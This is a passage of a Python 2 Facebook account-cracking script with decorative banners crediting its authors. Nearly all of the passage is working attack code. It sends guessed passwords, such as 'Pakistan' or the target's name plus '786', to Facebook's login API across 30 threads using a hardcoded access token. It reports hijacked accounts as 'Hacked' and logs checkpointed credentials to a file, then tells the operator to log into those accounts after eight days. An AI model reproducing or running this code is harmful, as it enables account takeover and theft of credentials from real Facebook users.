						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']							
						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user					
						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = 'Pakistan'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;91m[  ✓  ] \x1b[1;92mHacked⛔'											
				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user									
				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['first_name']+'12345'						
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHacked⛔'					
									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					
									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				
									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = b['last_name'] + '786'											
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHacked⛔'											
				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user										
				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['first_name'] + '786'					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHacked⛔'			
											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']			
											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user	
											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)
											                                       
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mB4Baloch\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By Shabir--•◈•---»" #Dev:B4BALOCH
	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 Dragon.py)↩\033[1;97m....'
	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;95m"+str(len(cekpoint))
	print """
_______$$$$$
____$$$$$$$$$$
___$$$$$$$$$$$$
__$$$$$$$$$$$$$
_$$$$$$$$$$$$$$
_$$$$$$$$$$$$$$
$$$_$$$$$$$$$$
$$$_$$$$$$$
$$__$$$$$
_$$$$$$$$$$
$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$
$$$$$_$$$$$$$$$$
$$$$$_$$$$$$$$$$$
$$$$___$$$$$$$$$$$
$$$$___$$$$$$$$$$$$
$$$$___$$$$$$$$$$$$$
$$$$___$$$$$$$$$$$$$$
$$$___$$$$$$$$$$$$$$$
$$$$__$$$$$$$$$$$$$$$
_$$$_$$$$$$$$$$$$$$$$
_$$$_$$$$$$$$$$$$$$$
_$$$$$$$$$$$$$$$$$$
_$$$$$$$$$$$$$$$$
_$$$$$$$$$$$$$$$$$
__$$_$$$$$$$$$$$$$$
______$$$$$$$$$$$$$$
______$$$$$$_$$$$$$$
______$$$$$$__$$$$$$$
_____$$$$$$$____$$$$$$
_____$$$$$$______$$$$$
_____$$$$$_______$$$$$
_____$$$$$_______$$$$
_____$$$$$______$$$$$
_____$$$$$______$$$$$
_____$$$$$______$$$$
______$$$$_____$$$$$
______$$$$_____$$$$
______$$$$$____$$$$
______$$$$$$___$$$$
_____$$JK$$$$_$$$$$
_____$$$$$$$$$$$$$$$
______$$__$$$$$$$$$$$
_______$____$$$$$$$$$$$
_______________$__$$$$$$$

 
         LOGIN CHECKPOINT ACCOUNT AFTER 8 DAYS

•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m ....🅡🅐🅙 🅚🅗🅞🅝🅓🅞🅚🅐🅡....... \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                WhatsApp Number
              \033[1;91m RaJ"""
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	menu()

if __name__ == '__main__':
	login()
